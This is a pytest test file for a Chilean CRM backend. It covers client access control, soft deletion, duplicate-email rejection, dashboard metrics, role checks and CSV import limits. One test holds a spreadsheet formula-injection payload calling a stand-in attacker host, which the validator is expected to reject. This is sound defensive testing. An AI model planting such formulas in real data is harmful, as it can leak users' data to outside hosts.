import pytest
from fastapi import HTTPException
from pydantic import ValidationError

from app.api.clientes import _ensure_cliente_access
from app.core.auth import ensure_platform_access, require_role
from app.models.cliente import ClienteCreate
from app.models.user import UserUpdate
from app.models_sql.user import User
from app.models_sql.cliente import Cliente
from app.models_sql.comercial import Opportunity, Proposal
from app.services.dashboard import build_dashboard
from app.services.clientes import (
    MAX_CSV_ROWS,
    create_cliente,
    delete_cliente,
    get_cliente_or_404,
    import_clientes_csv,
    list_clientes,
    parse_clientes_csv,
    update_cliente,
)
from app.services.users import list_users, update_user

def test_vendedor_cannot_access_cliente_from_another_owner():
    cliente = {"id": "cliente-1", "vendedorUid": "seller-2", "ownerUid": "seller-2"}
    user = {"uid": "seller-1", "rol": "vendedor"}
    with pytest.raises(HTTPException) as exc_info:
        _ensure_cliente_access(cliente, user)
    assert exc_info.value.status_code == 403

def test_supervisor_can_access_any_cliente():
    cliente = {"id": "cliente-1", "vendedorUid": "seller-2", "ownerUid": "seller-2"}
    user = {"uid": "supervisor-1", "rol": "supervisor"}
    _ensure_cliente_access(cliente, user)

def test_delete_cliente_hides_existing_document_without_physical_delete(db_session):
    created = create_cliente(
        db_session,
        ClienteCreate(
            nombre="Maria Soto",
            empresa="Granja Los Pinos",
            email="maria@lospinos.cl",
            rubro="Cerdos",
            region="Maule",
            vendedorUid="seller-1",
        ),
    )
    delete_cliente(db_session, created["id"])
    with pytest.raises(HTTPException) as exc_info:
        get_cliente_or_404(db_session, created["id"])
    assert exc_info.value.status_code == 404
    
    stored = db_session.query(Cliente).filter(Cliente.id == created["id"]).first()
    assert stored.estado == "Eliminado"
    assert list_clientes(db_session) == []

def test_list_clientes_limits_large_responses(db_session):
    for index in range(105):
        create_cliente(
            db_session,
            ClienteCreate(
                nombre=f"Cliente {index}",
                empresa=f"Empresa {index}",
                email=f"cliente{index}@enci.cl",
                rubro="Cerdos",
                region="Maule",
                vendedorUid="seller-1",
            ),
        )
    assert len(list_clientes(db_session, limit=10)) == 10

def test_manual_cliente_create_rejects_duplicate_email(db_session):
    create_cliente(
        db_session,
        ClienteCreate(
            nombre="Cliente Uno",
            empresa="Empresa Uno",
            email="contacto@empresa.cl",
            rubro="Aves",
            region="Maule",
            vendedorUid="seller-1",
        ),
    )
    with pytest.raises(HTTPException) as exc_info:
        create_cliente(
            db_session,
            ClienteCreate(
                nombre="Cliente Dos",
                empresa="Empresa Dos",
                email="CONTACTO@empresa.cl",
                rubro="Cerdos",
                region="Bio Bio",
                vendedorUid="seller-1",
            ),
        )
    assert exc_info.value.status_code == 409
    assert len(list_clientes(db_session, limit=None)) == 1

def test_manual_cliente_update_rejects_duplicate_email_but_allows_current_email(db_session):
    first = create_cliente(
        db_session,
        ClienteCreate(
            nombre="Cliente Uno",
            empresa="Empresa Uno",
            email="uno@empresa.cl",
            rubro="Aves",
            region="Maule",
            vendedorUid="seller-1",
        ),
    )
    second = create_cliente(
        db_session,
        ClienteCreate(
            nombre="Cliente Dos",
            empresa="Empresa Dos",
            email="dos@empresa.cl",
            rubro="Cerdos",
            region="Bio Bio",
            vendedorUid="seller-1",
        ),
    )
    updated = update_cliente(db_session, first["id"], {"email": "uno@empresa.cl"})
    assert updated["email"] == "uno@empresa.cl"
    with pytest.raises(HTTPException) as exc_info:
        update_cliente(db_session, second["id"], {"email": "UNO@empresa.cl"})
    assert exc_info.value.status_code == 409

def test_dashboard_counts_all_clients_without_api_limit(db_session):
    for index in range(105):
        create_cliente(
            db_session,
            ClienteCreate(
                nombre=f"Cliente {index}",
                empresa=f"Empresa {index}",
                email=f"dashboard{index}@enci.cl",
                rubro="Aves",
                region="Maule",
                vendedorUid="seller-1",
            ),
        )
    dashboard = build_dashboard(db_session, vendedor_uid="seller-1")
    assert dashboard["totalClientes"] == 105

def test_dashboard_includes_commercial_metrics(db_session):
    c1 = create_cliente(db_session, ClienteCreate(nombre="C1", empresa="E1", email="c1@enci.cl"))
    c2 = create_cliente(db_session, ClienteCreate(nombre="C2", empresa="E2", email="c2@enci.cl"))
    
    op1 = Opportunity(id="op-1", clienteId=c1["id"], titulo="Op A", etapa="cotizacion", valorEstimado=250000, vendedorUid="seller-1")
    op2 = Opportunity(id="op-2", clienteId=c2["id"], titulo="Op B", etapa="negociacion", valorEstimado=750000, vendedorUid="seller-2")
    db_session.add(op1)
    db_session.add(op2)
    
    prop1 = Proposal(id="prop-1", clienteId=c1["id"], oportunidadId="op-1", titulo="Prop A", estado="aceptada", montoNeto=90000, descuentoPct=0, vendedorUid="seller-1")
    db_session.add(prop1)
    db_session.commit()

    dashboard = build_dashboard(db_session, vendedor_uid="seller-1")
    assert dashboard["totalOportunidades"] == 1
    assert dashboard["valorPipeline"] == 250000
    assert dashboard["totalPropuestas"] == 1
    assert dashboard["valorPropuestasAceptadas"] == 90000
    assert dashboard["oportunidadesPorEtapa"] == [{"clave": "cotizacion", "total": 1}]
    assert dashboard["propuestasPorEstado"] == [{"clave": "aceptada", "total": 1}]

def test_list_users_limits_large_responses(db_session):
    for index in range(105):
        u = User(
            id=f"user-{index}",
            email=f"user{index}@enci.cl",
            nombre=f"User {index}",
            rol="vendedor",
            activo=True,
        )
        db_session.add(u)
    db_session.commit()
    assert len(list_users(db_session, limit=25)) == 25

def test_cliente_rejects_formula_injection_payloads():
    with pytest.raises(ValidationError):
        ClienteCreate(
            nombre="=IMPORTXML(\"http://attacker\")",
            empresa="Empresa",
            email="cliente@enci.cl",
            rubro="Cerdos",
            region="Maule",
        )

def test_cliente_rejects_unexpected_sensitive_fields():
    with pytest.raises(ValidationError):
        ClienteCreate.model_validate({
            "nombre": "Cliente",
            "empresa": "Empresa",
            "email": "cliente@enci.cl",
            "rol": "admin",
        })

def test_user_update_rejects_unknown_sensitive_fields():
    with pytest.raises(ValidationError):
        UserUpdate.model_validate({
            "nombre": "Usuario",
            "uid": "other-user",
            "email": "other@enci.cl",
        })

def test_user_update_accepts_lookup_email_for_provisioning():
    payload = UserUpdate.model_validate({
        "lookupEmail": "lookup@enci.cl",
        "rol": "vendedor",
    })
    assert str(payload.lookupEmail) == "lookup@enci.cl"
    assert payload.rol == "vendedor"

def test_update_user_forces_platform_access_off_without_role(db_session):
    u = User(id="user-1", email="user@enci.cl", nombre="Usuario", rol="vendedor", appMovil=True, webApp=True, activo=True)
    db_session.add(u)
    db_session.commit()

    updated = update_user(db_session, "user-1", {
        "rol": "sin_acceso",
        "appMovil": True,
        "webApp": True,
    })
    assert updated["rol"] == "sin_acceso"
    assert updated["appMovil"] is False
    assert updated["webApp"] is False
    assert updated["rango"] == "Sin acceso"

def test_platform_access_rejects_disabled_web_app():
    with pytest.raises(HTTPException) as exc_info:
        ensure_platform_access({
            "rol": "vendedor",
            "webApp": False,
            "appMovil": True,
        }, "web")
    assert exc_info.value.status_code == 403

def test_platform_access_rejects_disabled_mobile_app():
    with pytest.raises(HTTPException) as exc_info:
        ensure_platform_access({
            "rol": "vendedor",
            "webApp": True,
            "appMovil": False,
        }, "mobile")
    assert exc_info.value.status_code == 403

def test_cliente_phone_accepts_chilean_mobile_local_digits():
    cliente = ClienteCreate(
        nombre="Cliente Telefono",
        empresa="Empresa Telefono",
        email="telefono@enci.cl",
        telefono="12345678",
        rubro="Aves",
        region="Maule",
    )
    assert cliente.telefono == "12345678"

def test_cliente_phone_normalizes_full_chilean_mobile():
    cliente = ClienteCreate(
        nombre="Cliente Telefono",
        empresa="Empresa Telefono",
        email="telefono.full@enci.cl",
        telefono="+56912345678",
        rubro="Aves",
        region="Maule",
    )
    assert cliente.telefono == "12345678"

def test_cliente_phone_rejects_incomplete_local_digits():
    with pytest.raises(ValidationError):
        ClienteCreate(
            nombre="Cliente Telefono",
            empresa="Empresa Telefono",
            email="telefono.bad@enci.cl",
            telefono="1234567",
            rubro="Aves",
            region="Maule",
        )

def test_csv_rejects_invalid_encoding():
    with pytest.raises(HTTPException) as exc_info:
        parse_clientes_csv(b"\xff\xfe\x00")
    assert exc_info.value.status_code == 400

def test_csv_rejects_oversized_file():
    content = b"nombre,empresa,email\n" + (b"a" * 1_000_001)
    with pytest.raises(HTTPException) as exc_info:
        parse_clientes_csv(content)
    assert exc_info.value.status_code == 413

def test_csv_rejects_too_many_rows():
    rows = [
        "nombre,empresa,email",
        *[f"Cliente {index},Empresa {index},cliente{index}@enci.cl" for index in range(MAX_CSV_ROWS + 1)],
    ]
    with pytest.raises(HTTPException) as exc_info:
        parse_clientes_csv("\n".join(rows).encode("utf-8"))
    assert exc_info.value.status_code == 413

def test_csv_import_rejects_duplicate_emails_without_partial_writes(db_session):
    content = "\n".join([
        "nombre,empresa,rut,rubro,email",
        "Cliente Uno,Empresa Uno,11.111.111-1,Aves,duplicado@enci.cl",
        "Cliente Dos,Empresa Dos,12.345.678-5,Aves,duplicado@enci.cl",
    ]).encode("utf-8")
    result = import_clientes_csv(db_session, content)
    assert result["importados"] == 0
    assert result["fallidos"] == 1
    assert result["errores"][0]["fila"] == 3
    assert list_clientes(db_session) == []

def test_csv_import_rejects_existing_email_without_partial_writes(db_session):
    create_cliente(
        db_session,
        ClienteCreate(
            nombre="Cliente Existente",
            empresa="Empresa Existente",
            email="existente@enci.cl",
            rubro="Aves",
            region="Maule",
            vendedorUid="seller-1",
        ),
    )
    content = "\n".join([
        "nombre,empresa,rut,rubro,email",
        "Cliente Nuevo,Empresa Nueva,11.111.111-1,Aves,existente@enci.cl",
    ]).encode("utf-8")
    result = import_clientes_csv(db_session, content)
    assert result["importados"] == 0
    assert result["fallidos"] == 1
    assert result["errores"][0]["fila"] == 2
    assert len(list_clientes(db_session)) == 1

@pytest.mark.anyio
async def test_inactive_user_cannot_pass_role_checker(db_session):
    u = User(id="seller-1", email="seller@enci.cl", nombre="Seller", rol="vendedor", activo=False)
    db_session.add(u)
    db_session.commit()
    checker = require_role("vendedor")
    with pytest.raises(HTTPException) as exc_info:
        await checker({"uid": "seller-1", "rol": "vendedor"}, db=db_session)
    assert exc_info.value.status_code == 403

@pytest.mark.anyio
async def test_admin_can_pass_supervisor_role_checker(db_session):
    u = User(id="admin-1", email="admin@enci.cl", nombre="Admin", rol="admin", activo=True, webApp=True, appMovil=True)
    db_session.add(u)
    db_session.commit()
    checker = require_role("supervisor")
    user = await checker({"uid": "admin-1", "rol": "admin"}, db=db_session)
    assert user["rol"] == "admin"

@pytest.mark.anyio
async def test_vendedor_cannot_pass_supervisor_role_checker(db_session):
    u = User(id="seller-1", email="seller@enci.cl", nombre="Seller", rol="vendedor", activo=True, webApp=True, appMovil=True)
    db_session.add(u)
    db_session.commit()
    checker = require_role("supervisor")
    with pytest.raises(HTTPException) as exc_info:
        await checker({"uid": "seller-1", "rol": "vendedor"}, db=db_session)
    assert exc_info.value.status_code == 403
    # Debe ser por ROL insuficiente, no por falta de acceso a la plataforma.
    assert exc_info.value.detail == "No tienes permisos para esta accion"
